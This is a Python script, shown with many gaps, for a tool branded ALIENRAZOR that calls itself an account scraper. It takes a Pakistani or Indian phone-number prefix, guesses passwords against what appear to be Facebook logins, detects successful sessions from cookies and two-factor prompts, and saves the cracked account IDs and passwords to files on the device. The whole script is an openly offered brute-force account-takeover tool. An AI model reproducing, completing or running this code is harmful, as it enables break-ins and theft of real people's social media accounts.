...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; ALIENRAZOR \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
ALIEN2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
\033[1;36m          GITHUB : ALIENRAZOR
 \033[1;36m         TOOL NAME : ACCOUNT SCRAPER
\033[92;1m______________________________________________________ \33
""")                          

def linex():
    print(f'{RED}______________________________________________________')
...
print("")
xxxx = str(len(ugen))
jalan(" \x1b[38;5;196m TOTAL USER AGENTS : " + xxxx)
print(" HEY USER GIVE ME SOME YOUR INFORMATION ❤")
print("")
print(f"{BLUE} PUT YOUR NAME LIKE  ALIENRAZOR")
...
def XYZ():
    ...
    print(f'{BLUE}______________________________________________________')
    print(f"\t      {WHITE}[{EXTRA} {ALIENR()} {WHITE}]")
    print(f" {GREEN}PREMIUM USER          {WHITE}: {GREEN}Mr {ORANGE} {NameX}")
    print(f"{BLUE}______________________________________________________")
    print(f"{RED}[01] {WHITE}SELECT COUNTRY")
    print(f"{RED}[02] {WHITE}OWNER GITHUB")
    print(f"{RED}[03] {WHITE}CONTACT FACEBOOK")
    print(f"{RED}[04] {WHITE}OWNER WHATSAPP")
    print(f"{RED}[00] {WHITE}EXIT PROGRAM ")
    print(f"\033[1;91m______________________________________________________")
    ALIENRAZOR = input("[√] CHOOSE : ")
    if ALIENRAZOR in ["1","01"]:
        passx()
    elif ALIENRAZOR in ["2","02"]:
        os.system("xdg-open https://github.com/Alienrazor")
        XYZ()
    elif ALIENRAZOR in ["3","03"]:
        os.system("xdg-open https://www.facebook.com/Alienrazor")
        XYZ()
    elif ALIENRAZOR in ["4","04"]:
        os.system("xdg-open https://wa.me/+923121340906")
        XYZ()
    elif ALIENRAZOR in ["0","00"]:
       exit()
    else:
...
def passx():
    ...
    print("")
    print(f"{RED}[01] {WHITE}AUTO PASS 7 DIGITS         {GREEN}[⭐]")
    print(f"{RED}[02] {WHITE}AUTO PASS 7 AND 11 DIGITS  {GREEN}[⭐]")
    print(f"{RED}[03] {WHITE}AUTO ULTIMATE PASS         {GREEN}[⭐]")
    print(f"\033[1;91m______________________________________________________")
    ALIENRAZOR = input("[√] CHOOSE : ")
    if ALIENRAZOR in ["1","01"]:
        pass1()
...
def pass1():
    ...
    print(f" {GREEN}[!] PAK SIM CODES : {Y}0306, 0312, 0345, 0337, 0337")
    print(f" {GREEN}[!] INDIA SIM CODES : {Y}91778, 91930 ,91902 ,91712")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    ...
    print('\x1b[38;5;46m[∆] SCRAPING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}______________________________________________________')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/ALIENRAZOR-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/ALIENRAZOR-CP.txt')
...
def Ulti():
    ...
    print(f" {GREEN}[!] INDIA SIM CODES : {Y}91778, 91930 ,91902 ,91712")
    linex()
    print(f" {GREEN}[!] BEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio ALIENRAZOR_OK.mp3")
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio ALIENRAZOR_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/ALIENRAZOR-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio ALIENRAZOR_CP.mp3")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ALIENRAZOR 🔥] [%s] \33[1;97m[OK:%s{ALIENRAZOR2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
